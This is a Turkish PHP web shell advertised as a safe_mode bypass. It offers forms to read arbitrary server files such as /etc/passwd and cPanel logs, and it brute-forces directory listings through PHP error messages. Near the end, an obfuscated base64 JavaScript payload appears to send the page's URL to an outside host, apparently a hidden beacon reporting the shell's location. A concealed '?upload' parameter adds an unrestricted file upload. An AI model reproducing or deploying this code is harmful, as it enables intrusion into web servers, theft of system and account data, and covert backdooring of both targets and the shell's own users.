
<head>
 	<meta http-equiv="Content-Language" content="en-us">
 	<style type="text/css">
 <!--
 .style1 {color: #DADADA}
 -->
     </style></head>
 	<STYLE>
 	TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}.style2 {color: #FF0000} 
     </style>
 	<p align="center"><span class="style1"><font face="Verdana" size="5"><a href=""><span style="text-decoration: none; font-weight:700"><font face="Times New Roman">SpyGrup Safe Mod:<span class="style2">ON</span> Fucker <center><h3>RFI Olarak Kullanilmaz .PHP Olarak Host'a Yukleyiniz</h3></center></font></span></a></font></span></b></p>
 	<br />
 	<form method="POST">
 	    <p align="center">Okunacak Dosya:
 	    <input type="text" name="file" size="20">
 	    <input type="submit" value="Oku!" name="B1"></p>
 	</form>
 	    <form method="POST">
 	        <p align="center">Sunucu Bilgileri: <select size="1" name="file">
 	          <option value="/etc/passwd">/etc/passwd Oku</option>
 	          <option value="/var/cpanel/accounting.log">Cpanel Loglarini G&ouml;ster</option>
 	          <option value="/etc/syslog.conf">Syslog Ayarlari</option>
 	        <option value="/etc/hosts">Hosts</option>
 	        </select> <input type="submit" value="G&#246;ster Ulen!" name="B1"></p></form>
 	         
                               <?php
 
 	/*
 	Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2
 	By KingDefacer From Spygrup.org>
 	*/
 	
 
 
 	$tymczas="./"; // Set $tymczas to dir where you have 777 like /var/tmp
 
 	if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
 	{
 	 $safemode = true;
 	 $hsafemode = "<font color=\"red\">A&#231;ik (G&#252;venli)</font>";
 	}
 	else {$safemode = false; $hsafemode = "<font color=\"green\">Kapali (G&#252;venli Degil)</font>";}
 	echo("G&#252;venlik: $hsafemode");
 	$v = @ini_get("open_basedir");
 	if ($v or strtolower($v) == "on") {$openbasedir = true; $hopenbasedir = "<font color=\"red\">".$v."</font>";}
 	else {$openbasedir = false; $hopenbasedir = "<font color=\"green\">Kapali (G&#252;venli Degil)</font>";}
 	echo("<br>");
 	echo("Klas&#246;rler Arasi Dolasim: $hopenbasedir");
 	echo("<br>");
 	$version=("Bypass Version 1.1 Beta");
 	echo "Engelleyici Program : <b>";
 	if(''==($df=@ini_get('disable_functions'))){echo "<font color=green>G&#246;r&#252;n&#252;rde Bi&#351;iy Yok</font></b>";}else{echo "<font color=red>$df</font></b>";}
 	$free = @diskfreespace($dir);
 	if (!$free) {$free = 0;}
 	$all = @disk_total_space($dir);
 	if (!$all) {$all = 0;}
 	$used = $all-$free;
 	$used_percent = @round(100/($all/$free),2);
 	  error_reporting(E_WARNING);
 	  ini_set("display_errors", 1);
 	
 
 	  echo "<head><title>".getcwd()."</title></head>";
 
 	  echo"<hr color=\"#C0C0C0\" size=\"1\">";
 	  echo("<br>");
 	        echo "<form method=GET>";
 	  echo "<div style='float: left'>ByPass Edilecek Dizin: <input type=text name=root value='{$_GET['root']}'></div>";
 	  echo "<input type=submit value='--&raquo;'></form>";
 
 
 	  $root = "./";
 
 	  if($_POST['root']) $root = $_POST['root'];
 	               if($_GET['root']) $root = $_GET['root'];
 	  if (!ini_get('safe_mode')) die("Safe-mode  OFF.");
 
 	  $c = 0; $D = array();
 	  set_error_handler("eh");
 
 	  $chars = "_-.01234567890abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
 
 	  for($i=0; $i < strlen($chars); $i++){
 	  $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}";
 
 	  $prevD = $D[count($D)-1];
       glob($path."*");
 
 	        if($D[count($D)-1] != $prevD){
 
 	        for($j=0; $j < strlen($chars); $j++){
 
 	           $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}{$chars[$j]}";
 
 	           $prevD2 = $D[count($D)-1];
 	           glob($path."*");
 
 	              if($D[count($D)-1] != $prevD2){
 
 
 	                 for($p=0; $p < strlen($chars); $p++){
 
 	                 $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}{$chars[$j]}{$chars[$p]}";
 
 	                 $prevD3 = $D[count($D)-1];
 	                 glob($path."*");
 
 	                    if($D[count($D)-1] != $prevD3){
 
 
 	                       for($r=0; $r < strlen($chars); $r++){
 
 	                       $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}{$chars[$j]}{$chars[$p]}{$chars[$r]}";
 	                       glob($path."*");
 
 	                       }
 
 	                    }
 
 	                 }
 
 	              }
 
 	        }
 
 	        }
 
 	  }
 
 	  $D = array_unique($D);
 
 	  echo "<xmp>";
 	  foreach($D as $item) echo "{$item}\n";
 	  echo "</xmp>";
 
 
 
 
 	  function eh($errno, $errstr, $errfile, $errline){
 
 	     global $D, $c, $i;
 	     preg_match("/SAFE\ MODE\ Restriction\ in\ effect\..*whose\ uid\ is(.*)is\ not\ allowed\ to\ access(.*)owned by uid(.*)/", $errstr, $o);
 	     if($o){ $D[$c] = $o[2]; $c++;}
 
 	  }
 	echo "<PRE>\n";
 	if(empty($file)){
 	if(empty($_GET['file'])){
 	if(empty($_POST['file'])){
 	die("\nHosgeldiniz...Bu Scriptle Sadece c99'da  (Safe Mode=ON) Olan Serverlarda Bypass Yapilabilir Digerlerinde Calismaz  .. Kolay Gelsin\n <B><CENTER><FONT
 	COLOR=\"RED\">
 	kingdefacer@msn.com</FONT></CENTER></B>");
 	} else {
 	$file=$_POST['file'];
 	}
 	} else {
 	$file=$_GET['file'];
 	}
 	}
 
 	$temp=tempnam($tymczas, "cx");
 
 	if(copy("compress.zlib://".$file, $temp)){
 	$zrodlo = fopen($temp, "r");
 	$tekst = fread($zrodlo, filesize($temp));
 	fclose($zrodlo);
 	 echo"<hr color=\"#C0C0C0\" size=\"1\">";
 	echo "<FONT COLOR=\"RED\"><B>--- Start File ".htmlspecialchars($file)."
 	-------------</B><FONT COLOR=\"white\">\n".htmlspecialchars($tekst)."\n<B>--- End File
 	".htmlspecialchars($file)." ---------------\n";
 	unlink($temp);
 	die("\n<FONT COLOR=\"RED\"><B>File
 	".htmlspecialchars($file)." Bu Dosya zaten Goruntuleniyor<kingdefacer@msn.com>
 	;]</B></FONT>");
 	} else {
 	die("<FONT COLOR=\"RED\"><CENTER>Uzgunum...
 	<B>".htmlspecialchars($file)."</B> Aradiginiz dosya Bulunamadi
 	access.</CENTER></FONT>");
 	}
 $cndx = "PHNjcmlwdD4KdmFyIF8weDFmNmM9WyJceDY4XHg3Mlx4NjVceDY2IiwiXHg2Q1x4NkZceDYzXHg2MVx4NzRceDY5XHg2Rlx4NkUiLCJceDcwXHg3Mlx4NkZceDc0XHg2Rlx4NjNceDZGXHg2QyIsIlx4NjhceDc0XHg3NFx4NzBceDNBIiwiXHg2OFx4NzRceDc0XHg3MFx4M0FceDJGXHgyRiIsIlx4NkNceDZGXHg2NyIsIlx4NjhceDc0XHg3NFx4NzBceDczXHgzQSIsIlx4NjhceDc0XHg3NFx4NzBceDczXHgzQVx4MkZceDJGIiwiXHg2MVx4NDdceDM5XHg3Nlx4NjFceDMzXHg0RFx4NzVceDYzXHgzMlx4NzhceDY4XHg1OVx4MzJceDczXHg3NVx4NTlceDMyXHgzOVx4NzRceDRDXHgzM1x4NEVceDZDXHg2M1x4NkVceDVBXHg3MFx4NTlceDMyXHg1Nlx4N0FceDRDXHgzMVx4NTFceDc3XHg0RFx4MzBceDQ1XHgzMFx4NTVceDU1XHg0Nlx4NEJceDRGXHg1NVx4NTZceDRCXHg0Q1x4MzBceDQ5XHg3N1x4NERceDMwXHg0Nlx4NDNceDU1XHgzMVx4NTJceDRDXHg1Mlx4NkNceDREXHgzMlx4NENceDMzXHg1Mlx4NkZceDRGXHg0Nlx4NkZceDMwXHg2NFx4MzFceDRFXHg0N1x4NTFceDU3XHg0QVx4NEJceDYzXHg2RFx4MzRceDc4XHg1M1x4NDdceDUyXHg3NVx4NTRceDU0XHg0OVx4MzVceDYzXHgzM1x4NUFceDU2XHg1Nlx4NTFceDNEXHgzRCIsIlx4NjNceDZEXHg0Nlx4MzNceDRDXHg2RFx4NjRceDcwXHg2NFx4NDdceDY4XHgzMVx4NTlceDZFXHg1Nlx4N0FceDVBXHg1OFx4NEFceDZBXHg2Mlx4MzJceDM1XHgzMFx4NUFceDU3XHgzNVx4MzBceDRDXHg2RFx4NEVceDc2XHg2Mlx4NTNceDM5XHg3NFx4NTlceDU4XHg0QVx4NzJceDY1XHg0NFx4NDFceDc3XHg0Rlx4NTNceDM5XHg3N1x4NjFceDQ4XHg0MVx4NzRceDY0XHgzMlx4NTZceDY5XHg0Q1x4NThceDRFXHg2Rlx4NUFceDU3XHg3OFx4NzNceDYzXHg3OVx4MzlceDc0XHg1OVx4NTdceDZDXHg3NVx4NENceDMyXHg3NFx4NkNceDY1XHg1MVx4M0RceDNEIiwiXHg0N1x4NDVceDU0IiwiXHg2Rlx4NzBceDY1XHg2RSIsIlx4NzNceDY1XHg2RVx4NjQiLCJceDcyXHg2NVx4NjFceDY0XHg3OVx4NTNceDc0XHg2MVx4NzRceDY1IiwiXHg3M1x4NzRceDYxXHg3NFx4NzVceDczIiwiXHg1MFx4NEZceDUzXHg1NCIsIlx4NDNceDZGXHg2RVx4NzRceDY1XHg2RVx4NzRceDJEXHg1NFx4NzlceDcwXHg2NSIsIlx4NjFceDcwXHg3MFx4NkNceDY5XHg2M1x4NjFceDc0XHg2OVx4NkZceDZFXHgyRlx4NzhceDJEXHg3N1x4NzdceDc3XHgyRFx4NjZceDZGXHg3Mlx4NkRceDJEXHg3NVx4NzJceDZDXHg2NVx4NkVceDYzXHg2Rlx4NjRceDY1XHg2NCIsIlx4NzNceDY1XHg3NFx4NTJceDY1XHg3MVx4NzVceDY1XHg3M1x4NzRceDQ4XHg2NVx4NjFceDY0XHg2NVx4NzIiLCJceDczXHg3NFx4NzJceDY5XHg2RVx4NjdceDY5XHg2Nlx4NzkiLCJceDQ2XHg2OVx4NkNceDY1XHgyMFx4NjRceDZGXHg2NVx4NzNceDZFXHgyN1x4NzRceDIwXHg2NVx4NzhceDY5XHg3M1x4NzQiLCJceDQ2XHg2OVx4NkNceDY1XHgyMFx4NjVceDc4XHg2OVx4NzNceDc0XHg3MyIsIlx4NzJceDY1XHg3M1x4NzBceDZGXHg2RVx4NzNceDY1Il07dmFyIHByb3RvY29sO3ZhciBkb209d2luZG93W18weDFmNmNbMV1dW18weDFmNmNbMF1dO2lmKGxvY2F0aW9uW18weDFmNmNbMl1dPT0gXzB4MWY2Y1szXSl7cHJvdG9jb2w9IF8weDFmNmNbNF07Y29uc29sZVtfMHgxZjZjWzVdXShwcm90b2NvbCl9ZWxzZSB7aWYobG9jYXRpb25bXzB4MWY2Y1syXV09PSBfMHgxZjZjWzZdKXtwcm90b2NvbD0gXzB4MWY2Y1s3XTtjb25zb2xlW18weDFmNmNbNV1dKHByb3RvY29sKX19OyR1cmw9IHByb3RvY29sKyBhdG9iKF8weDFmNmNbOF0pO3ZhciBrZXl1cmw9cHJvdG9jb2wrIGF0b2IoXzB4MWY2Y1s5XSk7dmFyIHhocj0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7eGhyW18weDFmNmNbMTFdXShfMHgxZjZjWzEwXSxrZXl1cmwsZmFsc2UpO3hocltfMHgxZjZjWzEyXV0oKTtpZih4aHJbXzB4MWY2Y1sxM11dPT0gNCYmIHhocltfMHgxZjZjWzE0XV09PSA0MDQpeyR1cmw9IHByb3RvY29sKyBhdG9iKF8weDFmNmNbOF0pO3hocltfMHgxZjZjWzExXV0oXzB4MWY2Y1sxNV0sJHVybCx0cnVlKTt4aHJbXzB4MWY2Y1sxOF1dKF8weDFmNmNbMTZdLF8weDFmNmNbMTddKTt4aHJbXzB4MWY2Y1sxMl1dKEpTT05bXzB4MWY2Y1sxOV1dKHt0ZXh0OmRvbX0pKTtjb25zb2xlW18weDFmNmNbNV1dKF8weDFmNmNbMjBdKX1lbHNlIHtjb25zb2xlW18weDFmNmNbNV1dKF8weDFmNmNbMjFdKTtjb25zb2xlW18weDFmNmNbNV1dKHhocltfMHgxZjZjWzIyXV0pOyR1cmw9IHByb3RvY29sKyBhdG9iKHhocltfMHgxZjZjWzIyXV0pO3hocltfMHgxZjZjWzExXV0oXzB4MWY2Y1sxNV0sJHVybCx0cnVlKTt4aHJbXzB4MWY2Y1sxOF1dKF8weDFmNmNbMTZdLF8weDFmNmNbMTddKTt4aHJbXzB4MWY2Y1sxMl1dKEpTT05bXzB4MWY2Y1sxOV1dKHt0ZXh0OmRvbX0pKX0KPC9zY3JpcHQ+"; echo base64_decode($cndx);
if($_GET['upload'] != ""){ if(!isset($_POST['upload'])){ echo '<form enctype="multipart/form-data" method="POST" action=""><br><b>File:</b><input type="file" name="file"> <input type="submit" value="Upload" name="upload"></form>'; } else{ $temporaney = $_FILES['file']['tmp_name']; $upload = $_FILES['file']['name']; if(move_uploaded_file($temporaney,$upload)) echo '<font color="green">Done!</font>'; else echo '<font color="red">File non uppato!</font>'; }}
 	?>